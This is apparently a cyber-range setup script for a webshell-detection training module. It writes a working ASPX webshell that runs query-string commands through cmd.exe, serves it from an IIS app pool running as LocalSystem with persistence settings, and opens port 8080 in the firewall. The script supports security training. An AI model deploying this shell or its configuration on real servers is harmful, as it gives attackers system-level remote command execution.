# =============================================================================
# Module 01 — SP01 Webshell IIS Setup
# OpenRaptor Cyber Range — OD@CIRT.APAC
#
# Run on SP01 (directly or via az vm run-command) to deploy the cmd.aspx
# webshell and its IIS site. Must use appcmd.exe to write to the correct
# (64-bit) applicationHost.config — PowerShell WebAdministration cmdlets
# run in 32-bit WOW64 context via run-command and write to the wrong config.
#
# What this script does:
#   1. Creates C:\inetpub\shell\ and deploys cmd.aspx + web.config
#   2. Creates ShellPool app pool (LocalSystem, AlwaysRunning, no idle timeout)
#   3. Creates ShellSite bound to *:8080 pointing at C:\inetpub\shell
#   4. Opens Windows Firewall for port 8080
#   5. Verifies the webshell responds with HTTP 200
#
# Usage (run directly on SP01 as admin):
#   .\sp01-webshell-setup.ps1
#
# Usage via az run-command (from orchestrator):
#   az vm run-command invoke -g RG-CIRTLAB-CORE -n win-norca-sp01 \
#     --command-id RunPowerShellScript \
#     --scripts "@sp01-webshell-setup.ps1"
#
# NOTE: Do NOT use Import-Module WebAdministration / Get-WebSite / New-WebSite
# via az run-command — those cmdlets run in 32-bit context and write to
# C:\Windows\SysWOW64\inetsrv\config\applicationHost.config, which IIS never
# reads. Always use appcmd.exe directly.
# =============================================================================

$ErrorActionPreference = "Stop"
$appcmd = "$env:SystemRoot\System32\inetsrv\appcmd.exe"
$shellDir = "C:\inetpub\shell"
$poolName = "ShellPool"
$siteName = "ShellSite"
$port     = 8080

Write-Host "------------------------------------------------" -ForegroundColor Yellow
Write-Host "-  SP01 Webshell IIS Setup                     -" -ForegroundColor Yellow
Write-Host "------------------------------------------------" -ForegroundColor Yellow
Write-Host ""

# --- Step 1: Deploy files ---
Write-Host "[1/5] Deploying webshell files..." -ForegroundColor Yellow

if (-not (Test-Path $shellDir)) {
    New-Item -ItemType Directory -Path $shellDir | Out-Null
}

# cmd.aspx — executes commands via query string: ?cmd=whoami
@"
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e) {
    string cmd = Request.QueryString["cmd"];
    if (!string.IsNullOrEmpty(cmd)) {
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + cmd;
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.RedirectStandardError = true;
        p.Start();
        string output = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
        p.WaitForExit();
        Response.ContentType = "text/plain";
        Response.Write(output);
    }
}
</script>
"@ | Out-File -FilePath "$shellDir\cmd.aspx" -Encoding UTF8

# web.config — minimal config to enable ASP.NET compilation
@"
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.web>
    <compilation debug="true" targetFramework="4.0" />
  </system.web>
  <system.webServer>
    <staticContent />
  </system.webServer>
</configuration>
"@ | Out-File -FilePath "$shellDir\web.config" -Encoding UTF8

Write-Host "  [OK] cmd.aspx and web.config deployed to $shellDir" -ForegroundColor Green

# --- Step 2: Create app pool ---
Write-Host "[2/5] Configuring app pool ($poolName)..." -ForegroundColor Yellow

$existingPool = & $appcmd list apppool $poolName 2>$null
if ($existingPool) {
    Write-Host "  [SKIP] $poolName already exists — reconfiguring" -ForegroundColor Yellow
    & $appcmd delete apppool $poolName | Out-Null
}

& $appcmd add apppool /name:$poolName /managedRuntimeVersion:"v4.0" | Out-Null
& $appcmd set apppool $poolName /processModel.identityType:LocalSystem | Out-Null
& $appcmd set apppool $poolName /startMode:AlwaysRunning | Out-Null
& $appcmd set apppool $poolName /processModel.idleTimeout:00:00:00 | Out-Null
& $appcmd set apppool $poolName /failure.rapidFailProtection:false | Out-Null
Write-Host "  [OK] $poolName created (LocalSystem, AlwaysRunning, no idle timeout)" -ForegroundColor Green

# --- Step 3: Create site ---
Write-Host "[3/5] Configuring IIS site ($siteName on :$port)..." -ForegroundColor Yellow

$existingSite = & $appcmd list site $siteName 2>$null
if ($existingSite) {
    Write-Host "  [SKIP] $siteName already exists — removing and recreating" -ForegroundColor Yellow
    & $appcmd stop site $siteName 2>$null | Out-Null
    & $appcmd delete site $siteName | Out-Null
}

& $appcmd add site /name:$siteName /bindings:"http/*:${port}:" /physicalPath:$shellDir | Out-Null
& $appcmd set app "${siteName}/" /applicationPool:$poolName | Out-Null
& $appcmd set site $siteName /serverAutoStart:true | Out-Null
& $appcmd start site $siteName | Out-Null
Write-Host "  [OK] $siteName created and started on port $port" -ForegroundColor Green

# --- Step 4: Firewall ---
Write-Host "[4/5] Configuring firewall rule..." -ForegroundColor Yellow

$existing = Get-NetFirewallRule -DisplayName "Lab Shell $port" -ErrorAction SilentlyContinue
if ($existing) {
    Write-Host "  [SKIP] Firewall rule already exists" -ForegroundColor Yellow
} else {
    New-NetFirewallRule -DisplayName "Lab Shell $port" `
        -Direction Inbound -Protocol TCP -LocalPort $port `
        -Action Allow -Profile Any | Out-Null
    Write-Host "  [OK] Firewall rule created for TCP $port" -ForegroundColor Green
}

# --- Step 5: Verify ---
Write-Host "[5/5] Verifying webshell..." -ForegroundColor Yellow

# Confirm site is in config
$siteCheck = & $appcmd list site $siteName
if ($siteCheck -match "Started") {
    Write-Host "  [OK] $siteName is Started in IIS config" -ForegroundColor Green
} else {
    Write-Host "  [FAIL] $siteName is not started: $siteCheck" -ForegroundColor Red
    exit 1
}

# Confirm port is listening
Start-Sleep -Seconds 2
$listening = netstat -ano | Select-String ":$port"
if ($listening) {
    Write-Host "  [OK] Port $port is listening" -ForegroundColor Green
} else {
    Write-Host "  [FAIL] Port $port is not listening" -ForegroundColor Red
    exit 1
}

# HTTP test
try {
    $r = Invoke-WebRequest "http://127.0.0.1:${port}/cmd.aspx?cmd=whoami" -UseBasicParsing -TimeoutSec 10
    $output = $r.Content.Trim()
    Write-Host "  [OK] HTTP 200 — webshell responds: $output" -ForegroundColor Green
} catch {
    Write-Host "  [FAIL] HTTP test failed: $($_.Exception.Message)" -ForegroundColor Red
    exit 1
}

Write-Host ""
Write-Host "Setup complete." -ForegroundColor Cyan
Write-Host "  Webshell: http://$(hostname):${port}/cmd.aspx?cmd=whoami" -ForegroundColor Cyan
Write-Host "  Also reachable: http://10.10.3.10:${port}/cmd.aspx?cmd=whoami" -ForegroundColor Cyan
Write-Host ""
Write-Host "IMPORTANT: This IIS site is intentionally vulnerable." -ForegroundColor Red
Write-Host "           It is the SCENARIO ARTEFACT for Module 01 — webshell detection." -ForegroundColor Red
Write-Host "           Do not expose this server to the internet." -ForegroundColor Red
